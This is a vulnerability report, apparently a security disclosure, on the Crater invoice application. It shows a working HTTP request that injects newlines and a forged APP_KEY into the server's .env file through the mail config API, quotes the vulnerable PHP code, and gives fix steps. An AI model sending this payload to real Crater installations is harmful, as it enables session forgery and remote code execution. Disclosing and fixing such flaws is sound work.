### Vulnerability details

**Official website / Product:** https://github.com/crater-invoice-inc/crater

**Repository:** crater-invoice-inc/crater (stars at selection: 8356)

**Vulnerability type:** RCE (`.env` injection → APP_KEY / config poisoning; chains with cookie session deserialization)

**Vulnerability versions:** master `05d5ce26` (6.0.6 / current default branch)

**Vulnerability URL / Parameter:** `POST /api/v1/mail/config`, parameters `from_name`, `mail_password`, `mail_host`, etc.

**Complex:** yes

### Verification procedure

1. Authenticate as company Owner (`manage email config`).
2. Call the mail config API with a `from_name` value that closes the quote and injects newlines plus an extra `APP_KEY=` line.
3. Confirm `.env` contains `#R1A4_ENV_INJECT` and a second `APP_KEY=` entry.

Vulnerability HTTP request:

```http
POST /api/v1/mail/config HTTP/1.1
Host: 127.0.0.1:18104
Authorization: Bearer <token>
company: 1
Content-Type: application/json
Accept: application/json

{
  "mail_driver": "smtp",
  "mail_host": "127.0.0.1",
  "mail_port": "25",
  "mail_username": "u",
  "mail_password": "p",
  "mail_encryption": "tls",
  "from_name": "evil\"\n#R1A4_ENV_INJECT\nAPP_KEY=base64:INJECTEDFROMMAILKEY000000000000000000000=\nMAIL_FROM_NAME=\"keep",
  "from_mail": "a@b.c"
}
```

Verification result:

API returns `{"success":"mail_variables_save_successfully"}`. `.env` contains:

```
MAIL_FROM_NAME="evil"
#R1A4_ENV_INJECT
APP_KEY=base64:INJECTEDFROMMAILKEY000000000000000000000=
MAIL_FROM_NAME="keep"
```

Arbitrary environment lines (including `APP_KEY`) can be appended. With default `SESSION_DRIVER=cookie`, an attacker-controlled APP_KEY that becomes active enables forged encrypted session cookies and deserialization RCE in the CVE-2024-55556 class.

### Vulnerability analysis

`EnvironmentManager::getMailData()` concatenates request fields into `.env` text without sanitizing CR/LF or quotes:

- `MAIL_PASSWORD=` + raw `$request->mail_password`
- `MAIL_FROM_NAME="` + `$request->from_name` + `"` (quote breakout)

`saveMailVariables` writes via `str_replace` with no escaping. Callable by Owner.

Vulnerable trigger / sink source (complete path and line numbers):

```php
# File: app/Space/EnvironmentManager.php
# Lines: 293-301 (smtp branch)
$newMailData =
    'MAIL_DRIVER='.$request->mail_driver."\n".
    'MAIL_HOST='.$request->mail_host."\n".
    'MAIL_PORT='.$request->mail_port."\n".
    'MAIL_USERNAME='.$request->mail_username."\n".
    'MAIL_PASSWORD='.$request->mail_password."\n".
    'MAIL_ENCRYPTION='.$request->mail_encryption."\n\n".
    'MAIL_FROM_ADDRESS='.$request->from_mail."\n".
    'MAIL_FROM_NAME="'.$request->from_name."\"\n\n";
```

```php
# File: app/Http/Controllers/V1/Admin/Settings/MailConfigurationController.php
# Lines: 34-45
public function saveMailEnvironment(MailEnvironmentRequest $request)
{
    $this->authorize('manage email config');
    $results = $this->environmentManager->saveMailVariables($request);
    return response()->json($results);
}
```

### Vulnerability Fix

1. Reject CR/LF and unescaped quotes in every value written to `.env`; use a safe dotenv writer.
2. Prefer DB-backed mail settings instead of rewriting `.env` at runtime.
3. Rotate APP_KEY and avoid `SESSION_DRIVER=cookie`.
